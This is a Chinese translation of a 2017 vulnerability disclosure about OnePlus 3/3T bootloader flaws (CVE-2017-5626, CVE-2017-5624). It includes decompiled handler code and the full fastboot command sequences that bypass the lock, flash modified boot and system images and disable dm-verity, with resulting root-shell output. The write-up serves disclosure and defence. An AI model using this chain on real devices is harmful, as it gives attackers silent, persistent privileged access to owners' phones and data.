@@ -1,0 +1,333 @@
+# 【漏洞分析】获取已锁定的OnePlus 3/3T：引导加载程序漏洞
+
+阅读量 **229406**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-02-13 11:54:16
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：securityresear.ch
+
+原文地址：<https://securityresear.ch/2017/02/08/oneplus3-bootloader-vulns/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+翻译：[胖胖秦](http://bobao.360.cn/member/contribute?uid=353915284)
+
+预估稿费：120RMB
+
+投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
+
+  
+
+**前言**
+
+在这篇博文中，我公开了OnePlus
+3/3T引导加载程序中的两个漏洞。第一个[CVE-2017-5626](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5626)是影响OxygenOS
+3.2-4.0.1（4.0.2修补）的高危漏洞。该漏洞允许一个物理对手（或使用ADB/
+FASTBOOT访问）来绕过bootloader的锁定状态，即使Allow OEM
+Unlocking被禁用，无需用户确认并不会触发出厂重置。该漏洞允许内核代码执行（尽管启动时有[5秒警告](https://securityresear.ch/2017/02/08/oneplus3-bootloader-vulns/#exploiting-cve-2017-5626-for-kernel-code-execution)）。第二个漏洞[CVE-2017-5624](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5624)影响至今OxygenOS的所有版本，允许攻击者禁用dm-verity。这些漏洞的组合实现了强大的攻击 – 持久化的高权限代码执行，而不向用户发出任何警告，并且能够访问原始用户的数据（在受害者输入其凭据后）。
+
+OnePlus Security披露和承认了这两个漏洞。第一个漏洞[CVE-2017-5626](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5626)于1月23日被披露。它也是由OnePlus工程师独立发现的。[CVE-2017-5624](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5624)于1月16日被披露，在未来的OxygenOS版本中得到修复
+-今天的公开它的原因是因为已经有人在1月24日[公布](https://forum.xda-developers.com/oneplus-3/how-to/fix-easy-method-removing-dm-verity-t3544339)它了。
+
+免责声明：我只测试了OnePlus 3，但OnePlus 3T也包含漏洞。
+
+**绕过引导加载程序锁（CVE-2017-5626）**
+
+OnePlus 3 &3T运行OxygenOS 3.2 – 4.0.1系统,它有两个专用的FASTBOOT oem命令：
+
+1\. fastboot oem 4F500301-绕过bootloader的锁-允许使用FASTBOOT访问来解锁设备，无视OEM
+Unlocking，并无需用户确认，没有用户数据擦除（正确的解锁后通常会发生）。此外，在运行此命令后设备仍然报告处于锁定状态。
+
+2\. fastboot oem 4F500302 – 重置各种引导加载程序设置。例如，它将锁定未加锁的引导加载程序，无需用户确认。
+
+分析引导程序二进制表明其处理程序4F500301的命令非常简单：
+
+    
+    
+    // 'oem 4F500301' handler
+    int sub_918427F0()
+    {
+      magicFlag_dword_91989C10 = 1;
+      if ( dword_9198D804 != dword_9198D804 )
+        assert(1, dword_9198D804, dword_9198D804);
+      return sendOK((int)"", dword_9198D804);
+    }
+
+因此，它在91989C10设置了某些全局标志（我们命名为magicFlag）。通过观察其处理格式/擦除FASTBOOT命令的过程，我们可以清楚地看到在几项检查之后,magicFlag覆盖设备的锁定状态-刷入或删除分区：
+
+    
+    
+    // 'flash' handler
+    const char *__fastcall sub_91847EEC(char *partitionName, int *a2, int a3)
+    {
+      char *pname; // r5@1
+    ...
+      pname = partitionName;
+      v4 = a2;
+      v5 = a3;
+      if ( returnTRUE1(partitionName, (int)a2) )
+      {
+        result = (const char *)sub_918428F0(pname, v6);
+        if ( (result || magicFlag_dword_91989C10)
+          && ((result = (const char *)sub_91842880(pname, v10)) != 0 || magicFlag_dword_91989C10) )
+        {
+          result = (const char *)sub_918428F0(pname, v10);
+          if ( !result || magicFlag_dword_91989C10 )
+            goto LABEL_7;
+          v8 = dword_9198D804;
+          if ( dword_9198D804 != dword_9198D804 )
+            goto LABEL_28;
+          v11 = "Critical partition flashing is not allowed";
+        }
+        else
+        {
+          v8 = dword_9198D804;
+          if ( dword_9198D804 != dword_9198D804 )
+            goto LABEL_28;
+          v11 = "Partition flashing is not allowed";
+        }
+        return (const char *)FAIL2((int)v11, v10);
+      }
+    LABEL_7:
+      ...
+        if ( *v4 != 0xED26FF3A )
+        {
+          if ( *v4 == 0xCE1AD63C )
+            cmd_flash_meta_img(pname, (unsigned int)v4, v5);
+          else
+            cmd_flash_mmc_img(pname, (int)v4, v5);
+          goto LABEL_10;
+        }
+        v7 = v4;
+      }
+      cmd_flash_mmc_sparse_img(pname, (int)v7, v5);
+      ...
+     }
+    // 'erase' handler
+    int __fastcall sub_91847118(char *partitionName, int a2, int a3)
+    {
+     ...
+      v3 = partitionName;
+      v4 = returnTRUE1(partitionName, a2);
+      if ( !v4 )
+      {
+    LABEL_7:
+        ...
+        if ( v4 )
+        {
+          if ( dword_9198D804 == dword_9198D804 )
+            return eraseParition(v3);
+        }
+        ...
+      }
+      v4 = sub_918428F0(v3, v5);
+      if ( !v4 && !magicFlag_dword_91989C10 )
+      {
+        v6 = dword_9198D804;
+        if ( dword_9198D804 == dword_9198D804 )
+        {
+          v7 = "Partition erase is not allowed";
+          return FAIL2((int)v7, v5);
+        }
+        goto LABEL_23;
+      }
+      v4 = sub_91842880(v3, v5);
+      if ( !v4 && !magicFlag_dword_91989C10 )
+      {
+        v6 = dword_9198D804;
+        if ( dword_9198D804 == dword_9198D804 )
+        {
+          v7 = "Partition flashing is not allowed";
+          return FAIL2((int)v7, v5);
+        }
+    LABEL_23:
+        assert(v4, v5, v6);
+      }
+      v4 = sub_918428F0(v3, v5);
+      if ( !v4 || magicFlag_dword_91989C10 )
+        goto LABEL_7;
+      v6 = dword_9198D804;
+      ...
+      v7 = "Critical partition erase is not allowed";
+      return FAIL2((int)v7, v5);
+    }
+
+**利用CVE-2017-5626进行内核代码执行**
+
+通过利用此漏洞，攻击者可以刷入恶意引导映像（其中包含两个内核和Root
+RAMFS）来得到自身的平台。但问题是，引导程序和平台检测这样的修改，这被称为验证启动。引导加载程序验证boot和recovery分区-刷入一个修改的boot分区，例如，会在引导时提示以下警告：
+
+另一个不会触发此警告的选项是刷入旧的未修改的引导映像 – 较旧的映像包含可被攻击者利用的已知安全漏洞。
+
+总之，尽管有警告(5秒后自动消失),OnePlus 3 / 3T仍然允许在红色验证状态启动，因此攻击者的代码得到执行。
+
+有无数的方法来证明这种情况的严重性，所以我选择了最简单的方法。
+
+通过修改引导映像：
+
+1\. 我添加androidboot.selinux=permissive到内核命令行来设置SELinux的permissive模式。
+
+2\. 我已经修改了ramfsST
+ro.debuggable=1，ro.secure=0，ro.adb.secure=0，并改变了USB配置属性（sys.usb.config），包括启动adb。
+
+然后，我利用此漏洞，刷入修改后的boot.img（evil_boot.img）：
+
+    
+    
+    λ fastboot flash boot evil_boot.img
+    target reported max download size of 440401920 bytes
+    sending 'boot' (14836 KB)...
+    OKAY [  0.335s]
+    writing 'boot'...
+    FAILED (remote: Partition flashing is not allowed)
+    finished. total time: 0.358s
+    λ  fastboot oem 4F500301
+    ...
+    OKAY [  0.020s]
+    finished. total time: 0.021s
+    λ fastboot flash boot  evil_boot.img
+    target reported max download size of 440401920 bytes
+    sending 'boot' (14836 KB)...
+    OKAY [  0.342s]
+    writing 'boot'...
+    OKAY [  0.135s]
+    finished. total time: 0.480s
+
+于是我得到了一个root shell，甚至在用户输入他的凭据之前：
+
+    
+    
+    OnePlus3:/ # id
+    uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
+    1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
+    3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
+    OnePlus3:/ # getenforce
+    Permissive
+
+OnePlus 3 / 3T内核似乎是在启用LKM的情况下编译的，因此运行内核代码甚至不需要修补/重新编译内核。
+
+所以我创建了一个小的内核模块：
+
+    
+    
+    #include <linux/module.h>
+    #include <linux/kdb.h>
+    int init_module(void)
+    {
+        printk(KERN_ALERT "Hello From Kerneln");
+        return 1;
+    }
+
+然后将其加载到内核中：
+
+    
+    
+    OnePlus3:/data/local/tmp # insmod ./test.ko
+    OnePlus3:/data/local/tmp # dmesg | grep Hello
+    [19700121_21:09:58.970409]@3 Hello From Kernel
+
+**禁用dm-verity（CVE-2017-5624）**
+
+system分区的验证，不是boot＆recovery，是通过dm-verity驱动的。我们发现可以命令一个已锁定引导程序唤醒该平台,使用另一个FASTBOOT命令禁止dm-verity：fastboot oem
+disable_dm_verity。
+
+该oem disable_dm_verity处理程序如下：
+
+    
+    
+    // 'oem disable_dm_verity' handler
+    int sub_9183B8EC()
+    {
+      int v0; // r0@1
+      int v1; // r1@1
+      dmVerity_dword_91960740 = 0;
+      v0 = sub_91845E10("ANDROID-BOOT!");
+      if ( dword_9198D804 != dword_9198D804 )
+        assert(v0, v1, dword_9198D804);
+      return sendOK((int)"", v1);
+    }
+
+又一次，91960740设置了一些标志（我们称为dmVerity）。引导加载程序构建内核cmdline时会使用它：
+
+androidboot.enable_dm_verity内核命令行参数传递到ro.boot.enable_dm_verity,然后指示OnePlus的init,是否要禁用dm-verity：
+
+  
+
+**2个漏洞组合利用**
+
+这两个漏洞可以组合在一起，用于具有特权的SELinux域代码执行，而不向用户发出任何警告并访问原始用户数据。为了演示这一点（可能有成千上万更好的方法与更高的严重性），我修改了系统分区，添加了一个特权应用程序。可以在/system/priv-app/<APK_DIR>目录下放置APK下,最终将导致它被添加到[priv_app域](https://android.googlesource.com/platform/system/sepolicy/+/android-7.1.1_r16/priv_app.te)中。
+
+    
+    
+    λ fastboot flash system system-modded.simg
+    target reported max download size of 440401920 bytes
+    erasing 'system'...
+    FAILED (remote: Partition erase is not allowed)
+    finished. total time: 0.014s
+    λ fastboot oem 4F500301
+    OKAY
+    [  0.020s] finished. total time: 0.021s
+    λ fastboot flash system system-modded.simg
+    target reported max download size of 440401920 bytes erasing 'system'...
+    OKAY [  0.010s]
+    ...
+    sending sparse 'system' 7/7 (268486 KB)...
+    OKAY [  6.748s]
+    writing 'system' 7/7...
+    OKAY [  3.291s]
+    finished. total time: 122.675s
+    λ fastboot oem disable_dm_verity
+    ...
+    OKAY
+    [  0.034s] finished. total time: 0.036s
+
+事实上，加载priv_app的应用程序上下文如下：
+
+    
+    
+    1|OnePlus3:/ $ getprop | grep dm_verity
+    [ro.boot.enable_dm_verity]: [0]
+    OnePlus3:/ $ ps -Z | grep roeeh
+    u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S roeeh.fooapp
+
+**演示视频**
+
+以下视频显示结果 – 平台已加载并没有警告，并安装了特权应用程序。
+
+本文翻译自securityresear.ch
+[原文链接](https://securityresear.ch/2017/02/08/oneplus3-bootloader-vulns/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **胖胖秦** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/85467](/post/id/85467)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[securityresear.ch](https://securityresear.ch/2017/02/08/oneplus3-bootloader-vulns/)
+
+如若转载,请注明出处： <https://securityresear.ch/2017/02/08/oneplus3-bootloader-vulns/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0130c8844942b1f889.jpg) 胖胖秦
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
